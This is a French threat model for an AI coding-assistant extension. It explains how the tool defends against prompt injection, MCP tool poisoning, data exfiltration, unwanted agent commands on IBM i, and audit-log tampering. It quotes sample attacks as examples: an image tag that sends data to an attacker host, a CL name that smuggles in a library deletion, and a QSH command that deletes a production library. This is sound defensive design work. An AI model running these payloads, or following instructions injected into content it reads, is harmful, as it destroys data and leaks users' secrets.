# Modèle de menace

Chaque entrée donne le **vecteur**, l'**impact**, la **parade dans le code** — jamais dans un
prompt — et le **résidu assumé**. Un risque non couvert mais écrit vaut mieux qu'un risque couvert
qui n'existe que dans une intention.

Ce qui n'est **pas** une parade : une phrase du prompt système. « Traite le contenu joint comme des
données » ne survit pas à une injection bien construite, parce que la consigne et l'attaque arrivent
par le même canal.

---

## 1. Fuite de code source vers un tiers

**Vecteur.** Le fonctionnement normal d'un assistant : compléter, discuter, agir. Chaque appel
distant emporte du contexte.

**Impact.** Du code sous NDA, une clé, un nom de client dans les journaux d'un fournisseur.

**Parade (code).** `src/extension/egress.ts` + `src/core/redaction/`. Quatre étapes avant tout appel
distant : globs interdits, anonymisation réversible, refus sur secret, consentement par destination.
Le caractère « local » est décidé par l'URL (`isLocalEndpoint`), pas par le nom du réglage : pointer
le fournisseur « local » vers une adresse publique déclenche tout le dispositif. La complétion
inline refuse un fichier interdit même en mode distant, car le préfixe partirait.

**Résidu, assumé.** Un utilisateur qui règle `egressPolicy: "trust"`, choisit `redaction: "off"` et
coche `allowUnredacted` obtient exactement ce qu'il a demandé. L'outil rend le choix explicite ; il
ne l'interdit pas — c'est le rôle de la stratégie de réglages d'entreprise, pas d'un défaut caché.

---

## 2. Injection indirecte par un fichier, un journal ou une page

**Vecteur.** Tout ce que l'assistant lit : un fichier du dépôt, la sortie d'une commande, un
`node_modules` que personne n'a relu, une page collée. En mode agent, ce contenu revient dans le
prompt à chaque étape.

**Impact.** Le modèle suit des instructions venues du contenu : exfiltrer, écrire un fichier,
proposer une commande. En mode agent, cela devient une tentative d'action.

**Parade (code).** `src/core/session/session.ts` — `renderEntry()`. Le contenu joint n'est jamais
concaténé à la phrase de l'utilisateur : il forme un bloc clos par un **nonce de 128 bits tiré à
chaque tour**, et toute séquence en forme de délimiteur présente dans le contenu est remplacée par
`⟦removed-fence⟧`. Le canal d'instruction se réduit à deux choses : le prompt système et ce que la
personne a tapé.

Deuxième parade, indépendante : **l'approbation par action**. Une injection réussie ne peut pas
écrire un fichier ni lancer une commande sans qu'un humain lise la description et clique.

**Résidu, assumé.** Rien n'empêche un modèle d'être *persuadé* par ce qu'il lit. La séparation
structurelle garantit seulement que « l'utilisateur me demande ceci » et « j'ai lu cela » restent
distinguables, et que le pouvoir d'agir reste derrière un humain.

---

## 3. Exfiltration par le panneau

**Vecteur.** La réponse du modèle est affichée. Une réponse fabriquée par une injection peut
contenir du HTML : `<img src="https://attaquant/?d=…">`, un lien piégé, du script.

**Impact.** Une requête sortante déclenchée par le simple affichage, emportant ce que l'attaquant a
placé dans l'URL.

**Parade (code).** `src/webview/main.ts` ne fait **aucun** `innerHTML` sur du texte de modèle : le
Markdown est rendu en nœuds DOM construits un par un, le texte passe par `textContent`. Et
`src/extension/chat.ts` pose une CSP `default-src 'none'` avec un nonce par chargement : même un
script injecté ne s'exécuterait pas, et aucune origine distante n'est joignable depuis le panneau.
Les rapports (envois, coûts) sont servis avec `enableScripts: false`.

**Résidu, assumé.** Le texte affiché peut rester trompeur (un chemin ou une commande plausible).
C'est un problème de vigilance humaine, pas d'exécution.

---

## 4. Écriture ou exécution non voulue par l'agent

**Vecteur.** Le mode agent modifie des fichiers et propose des commandes.

**Impact.** Perte de travail, exécution d'une commande destructrice, écriture hors du projet.

**Parade (code).** `src/extension/tools.ts` et `src/cli/tools.ts` :

- tout chemin est résolu et **refusé s'il sort de l'espace de travail** ou s'il correspond à un glob
  interdit — un `..` dans un argument produit par le modèle est rejeté, jamais interprété ;
- « absolu » et « dehors » sont deux choses : un chemin absolu est accepté s'il tombe dans un dossier
  ouvert, ou s'il est exactement un fichier ouvert, et refusé sinon ([ADR-0014](adr/0014-un-chemin-absolu-n-est-pas-un-chemin-dehors.md)).
  L'appartenance est décidée sur les chaînes : **résidu assumé**, un lien symbolique placé dans le
  projet et pointant dehors reste un chemin « dedans » ;
- toute écriture passe par `approval()` puis par un **diff** (vue de comparaison dans l'éditeur,
  diff imprimé dans le terminal) ;
- dans l'éditeur, les modifications sont des `WorkspaceEdit` : elles sont dans la pile d'annulation
  et dans le diff Git, contrairement à une écriture directe sur le disque ;
- `edit_file` exige un extrait **unique** : un extrait ambigu est refusé plutôt qu'appliqué au
  hasard ;
- l'absence de rappel d'approbation vaut refus (`runTurn` : le silence n'est pas un consentement).

**En arrière-plan, personne ne regarde — donc la barrière est plus haute, pas plus basse.**
Une tâche de fond (`src/core/background/`) obtient son propre **worktree git** sur sa propre branche,
et deux limites qui ne sont pas celles du mode interactif :

- **sans moteur de conteneur, `run_command` est REFUSÉ** et non exécuté sur l'hôte. C'est la décision
  qui rend le reste défendable : un agent de fond capable de lancer n'importe quoi sur l'hôte est un
  agent de fond que personne ne devrait démarrer. Le refus nomme les deux issues — installer Docker
  ou Podman, ou lancer la tâche au premier plan — parce que « refusé » sans étape suivante est la
  façon dont quelqu'un finit par lancer la commande à la main ;
- avec un moteur, **aucun réseau du tout** (`--network none`), **seul le worktree monté**, et des
  quotas de processeur et de mémoire pour qu'une compilation emballée ne mette pas la machine à
  genoux en l'absence de son auteur. Un test le vérifie **contre un vrai conteneur** : pas
  d'interface réseau, pas de résolution de noms, et un chemin hors du worktree illisible.

Les **outils de fichier** sont un jeu à part, enraciné dans le worktree — pas ceux de l'éditeur, qui
sont enracinés dans l'espace de travail et permettraient à l'agent de modifier le fichier que son
auteur a ouvert, au milieu de sa propre édition. Et il n'y a **aucun outil git** : la branche reste
locale, l'agent ne pousse jamais, et un test lit le module pour s'en assurer.

**La promotion vers la production n'est pas un outil de l'agent**, et ne peut pas être configurée
pour l'être. Sur une partition gérée par ARCAD Elias, un changement n'entre pas en production parce
que quelqu'un a édité un membre : il est extrait, modifié, réintégré, construit, puis **promu** par
une personne qui en répond. La dernière étape est une décision de livraison, et une décision de
livraison n'est pas un appel d'outil. La garantie tient à la **liste blanche** d'actions `arcad.*`
que le pont expose (`extension/integrations/arcad.ts`) et non à une consigne : un test lit cette
liste dans le source et refuse toute entrée qui ressemble à une promotion
(`looksLikePromotion`, `src/core/ibmi/delivery.ts`), parce que la promesse se tient par le fait que
personne n'ajoute la mauvaise commande dans six mois. Et l'agent ne propose la réintégration qu'une
fois le changement **compilé et testé dans le tour** : réintégrer un membre qui ne compile pas remet
un composant cassé à la construction de tout le monde.

**QTEMP est la seule bibliothèque qu'un outil en lecture peut écrire**, et la garde le sait
explicitement (`SCRATCH_LIBRARY`, `src/core/ibmi/guard.ts`). La raison n'est pas une convention mais
une propriété de la bibliothèque : elle est créée par travail, détruite avec lui, invisible des
autres travaux, et rien de la production ne s'atteint par elle. Demander « quels programmes
utilisent ce fichier » passe par `DSPPGMREF` vers un **fichier de sortie**, donc un outil qui ne fait
que lire doit malgré tout écrire quelque part. L'exemption vit dans la garde et non dans chaque
outil : un outil qui s'accorde une exemption est un outil qui peut se tromper, et le suivant recopie
l'exemption sans recopier la raison. Elle ne vaut que pour la bibliothèque nommée QTEMP — une
commande qui écrit dans QTEMP *et* dans CUSTMAST reste une commande qui écrit dans CUSTMAST — et
`ibmi_impact` fait passer **sa propre commande** par la garde avant de la lancer, pour qu'un
`OUTFILE` déplacé ailleurs échoue bruyamment au lieu de reposer sur un commentaire resté vrai.

**Compiler** (`src/core/ibmi/compile.ts`) crée un objet, donc c'est une écriture et elle est bornée
par la même liste — avec deux précisions qui lui sont propres :

- la liste vide ne désactive pas la barrière, elle la rend **visible** : la compilation est toujours
  soumise à approbation et la carte dit que rien ne la borne. Une barrière silencieusement inactive
  sur l'opération qui crée des objets serait le pire des deux mondes ;
- **chaque nom est refusé plutôt qu'échappé.** Bibliothèque, fichier source, membre et bibliothèque
  cible viennent du modèle et sont interpolés dans une commande CL et dans du SQL. Un nom qui n'est
  pas un nom IBM i valide (dix caractères, lettre ou `# $ @` en tête) est rejeté : `CUSTRPT) MONMSG
  MSGID(CPF0000) DLTLIB LIB(PROD` est une chaîne acceptable et une commande catastrophique, et la
  garde CL ne peut rien y faire — elle relit une commande *après* sa construction, et celle-ci
  aurait été construite par nous pour le compte du modèle. Idem pour le nom de travail que la
  partition renvoie avant qu'il ne reparte dans une requête.

**Sur IBM i** (`src/core/ibmi/guard.ts`), `hiveyCode.ibmi.writableLibraries` ajoute une barrière
dans le code, du même genre que l'outillage du mode Plan :

- toute commande CL ou instruction SQL qui **modifie** doit nommer sa bibliothèque, et chacune doit
  figurer dans la liste ; la lecture n'est jamais restreinte ;
- un verbe CL que l'extension ne reconnaît pas comme lecteur **compte comme écrivain** : se tromper
  dans ce sens coûte un refus que l'utilisateur lève, se tromper dans l'autre coûte un fichier de
  production ;
- une commande **non qualifiée** est refusée : elle se résoudrait sur la liste de bibliothèques du
  travail, qui n'est pas connaissable ici ;
- une commande qui porte ce qu'elle va faire **dans une chaîne** — `QSH`, `STRQSH`, du CL passé à
  `QCMDEXC` ou `QCAPCMD` — est refusée d'emblée, **même lorsqu'elle semble nommer une bibliothèque
  autorisée**. `QSH` figurait parmi les verbes de lecture : `QSH CMD('rm -r /QSYS.LIB/PROD.LIB')`
  passait donc la barrière sans être regardé.

**Résidu, assumé.** Un utilisateur qui approuve sans lire approuve quand même. Le nombre d'étapes
d'un tour est plafonné (12) pour qu'une boucle ne demande pas trente fois d'affilée. Sur IBM i, la
barrière n'empêche pas une commande autorisée de détruire quelque chose **dans** une bibliothèque
autorisée : elle borne le périmètre, pas le geste. Et elle est **vide par défaut** — une
installation qui ne la configure pas n'a pas de périmètre.

---

## 5. Vol des clés d'API

**Vecteur.** Réglages synchronisés, `settings.json` committé, capture d'écran, journal.

**Impact.** Facturation détournée, accès aux modèles de l'entreprise.

**Parade (code).** `src/extension/config.ts` — les clés vivent dans `vscode.SecretStorage` (trousseau
du système). Aucun réglage n'accepte de clé ; la seule voie d'entrée est une commande qui saisit en
mode mot de passe. Côté terminal, la clé vient d'une **variable d'environnement nommée** par la
configuration (`apiKeyEnv`), jamais du fichier de configuration lui-même — un projet peut donc
committer sa configuration d'équipe.

**Résidu, assumé.** Un poste compromis lit le trousseau. Rien à ce niveau ne s'y oppose.

---

## 6. Une clé dans le contexte

**Vecteur.** Le développeur ouvre un `.env`, colle une trace contenant un jeton, ou l'agent lit un
fichier de configuration.

**Impact.** Le secret part chez un fournisseur, apparaît dans ses journaux, et doit être révoqué.

**Parade (code).** `src/core/redaction/detectors.ts`. Formes connues (AWS, GitHub, Slack, Stripe,
OpenAI, Anthropic, OpenRouter, Google, npm, JWT, blocs PEM, identifiants dans une URL) plus un
**filet à entropie** pour les jetons qu'aucune règle ne connaît. Le niveau `off` ne s'applique jamais
aux secrets. Les globs interdits couvrent les fichiers qui n'ont aucune raison d'être lus.

Le même détecteur scanne **ce dépôt** à chaque CI (`scripts/scan-secrets.mjs`) : c'est ce qui a
révélé, dès le premier passage, 37 faux positifs de la règle « valeur assignée » — corrigés depuis,
avec un test de non-régression.

**Résidu, assumé.** Un secret sans forme reconnaissable et à faible entropie (`password = soleil`)
passe. Aucun scanner n'y échappe.

---

## 7. Chaîne d'approvisionnement

**Vecteur.** Une dépendance compromise s'exécuterait dans l'hôte d'extension, avec accès au système
de fichiers, au réseau et au trousseau.

**Impact.** Total.

**Parade (code).** **Aucune dépendance à l'exécution.** Le `.vsix` ne contient que du code de ce
dépôt. Les quatre outils de développement sont épinglés, suivis par Dependabot, et `npm audit`
casse la CI au niveau `high`. CodeQL tourne sur les poussées et chaque semaine. Un SBOM est publié
à chaque build.

**Parade (livraison), depuis la 0.39.0.** Le `.vsix` publié porte son empreinte SHA-256 et une
**attestation de provenance Sigstore** émise par le workflow qui l'a produit, via l'identité OIDC
que GitHub émet pour cette exécution précise. `gh attestation verify hivey-code.vsix --repo
FlorianMartins/hivey-vscode` répond à la question « ce que j'installe est-il bien ce qui est sur
GitHub, construit depuis ce commit ». Les outils de construction (`@vscode/vsce`, `cyclonedx-npm`)
sont épinglés à une version exacte : un `@latest` dans une CI, c'est la prochaine release compromise
qui s'exécute dans le build.

**Résidu, assumé.** Une compromission d'`esbuild` ou de `typescript` toucherait le bundle produit —
l'attestation prouverait fidèlement qu'un artefact compromis a bien été construit par ce workflow.
Et la **reproductibilité octet pour octet n'est pas promise** : un `.vsix` est un zip, un zip porte
les dates de modification, deux constructions du même commit diffèrent donc. Elle est explicitement
hors périmètre plutôt que « à faire », parce qu'un `vsce` déterministe n'existe pas aujourd'hui.

---

## 8. Un serveur MCP qui change ce qu'il propose

**Vecteur.** Un serveur MCP est approuvé sur une **commande** : « ceci lance ce programme sur votre
machine ». Mais le pouvoir d'un outil sur la conversation n'est pas dans sa commande, il est dans sa
**description** — le texte que le modèle lit pour décider quand l'appeler et quoi lui passer. Un
serveur peut servir une description inoffensive le jour de l'approbation et une autre une semaine
plus tard. Les noms consacrés sont *tool poisoning* et *rug pull*.

**Impact.** Le serveur dicte au modèle des actions que l'utilisateur n'a jamais approuvées, en
utilisant les outils que l'utilisateur, lui, a bel et bien approuvés.

**Parade (code), depuis la 0.39.0.** L'approbation est **épinglée** aux descriptions et aux schémas,
pas seulement à la commande : une empreinte de l'ensemble des outils est enregistrée avec la
décision de confiance, et un changement rouvre le dialogue en **nommant** ce qui a changé — un outil
apparu, une description réécrite, un schéma élargi. Un dialogue qui dit seulement « quelque chose a
changé » apprend aux gens à cliquer « oui ». Un refus **ferme la connexion** : un programme que
l'utilisateur vient de refuser ne doit pas continuer à tourner. Les descriptions qui atteignent
malgré tout le modèle sont encadrées comme la parole d'un tiers, aplaties (ni saut de ligne ni
caractère de contrôle, donc pas de fausse frontière de message) et plafonnées à 1 200 caractères —
une instruction enterrée à la ligne quatre cents d'une « description » est une injection par le
volume même si chaque phrase est innocente.

**Résidu, assumé.** L'encadrement est une atténuation, pas une preuve : un modèle peut toujours se
laisser convaincre par du texte qu'on lui donne. Ce que le cadre supprime, c'est l'ambiguïté sur
**qui** a écrit la phrase, ce qui est la partie que l'extension peut réellement contrôler.

---

## 9. Falsification du journal des sorties

**Vecteur.** Le journal qui prouve ce qui est sorti est un tableau JSON dans l'état de l'espace de
travail. Tout ce qui peut écrire sur le disque peut le modifier — y compris la personne auditée.

**Impact.** Le contrôle sur lequel repose la conformité ne prouve rien : on peut supprimer la ligne
d'un envoi gênant et personne ne le saura.

**Parade (code), depuis la 0.39.0.** Chaque entrée porte l'empreinte de la précédente et un numéro
d'ordre. Modifier une ligne change son empreinte, ce qui casse le lien que porte la suivante et
toutes les suivantes : il faut réécrire toute la queue. Supprimer une ligne du milieu ne casse aucun
lien si l'on rechaîne — mais laisse un trou dans la numérotation, et c'est justement la modification
que quelqu'un voudrait faire. `Hivey Code : Vérifier…` répond, et `Hivey Code : Exporter…` met une
copie hors de portée (JSONL ou syslog RFC 5424, empreintes comprises).

**Parade, depuis la 0.77.0 — le résidu est fermé.** Deux choses atteignent l'extérieur de la
machine, et la preuve de souveraineté (`Hivey Code : Produire une preuve de souveraineté`) les
emploie toutes les deux :

- **l'horodatage RFC 3161 de la TÊTE de la chaîne**, auprès d'une autorité que l'organisation
  configure (`hiveyCode.audit.timestampUrl`). **Une seule empreinte sort**, et elle répond à une
  seule question : « cette empreinte existait à cet instant ». C'est exactement la question qu'un
  journal réécrit ne peut pas satisfaire — réécrire depuis le début produit une tête différente,
  qu'aucune autorité n'a jamais vue. ⚠️ L'extension **obtient et conserve** le jeton ; elle ne le
  **vérifie pas** : vérifier exige la racine de confiance de l'organisation, et c'est tout l'intérêt.
  Le dossier livré contient la commande `openssl ts -verify` à exécuter ;
- **l'envoi vers le collecteur** (§ Envoi du registre, `docs/PRIVACY.md`), qui met une copie hors de
  portée au moment où la ligne est écrite.

Le rapport est signé par la machine, et il **dit lui-même** ce que cela ne prouve pas : une
signature locale établit que le rapport n'a pas changé depuis son émission, pas que le registre dont
il est tiré était vrai. Rien produit sur la machine auditée ne peut l'établir.

**Résidu restant, assumé.** Sans autorité d'horodatage configurée **et** sans collecteur, la chaîne
reste purement locale et la réécriture complète reste indétectable — le rapport le dit en toutes
lettres plutôt que de laisser le lecteur le supposer. La troncature (le journal est plafonné à 500
entrées) est tolérée par la vérification, sans quoi le contrôle deviendrait inutile dès que le
plafond est atteint.

---

## 10. Un serveur « local » qui ne l'est pas

**Vecteur.** `endpoints.local` pointe vers une passerelle interne… qui journalise, ou vers une URL
publique par erreur de copier-coller.

**Impact.** Le mode qui promet « rien ne sort » fait sortir.

**Parade (code).** `isLocalEndpoint()` classe par adresse : loopback, RFC 1918, lien-local, CGNAT,
suffixes `.internal/.corp/.lan/.local`. Tout le reste est distant, avec anonymisation et
consentement, **quel que soit le réglage choisi**. La sonde qui détecte un serveur Ollama n'est
jamais envoyée à un point de terminaison distant : un tiers ne reçoit aucune requête que
l'utilisateur n'a pas demandée.

**Résidu, assumé.** Une passerelle sur une IP privée qui réexpédie vers un fournisseur public est
« locale » pour l'extension. C'est une décision de l'opérateur, et le journal des envois ne peut pas
la voir.
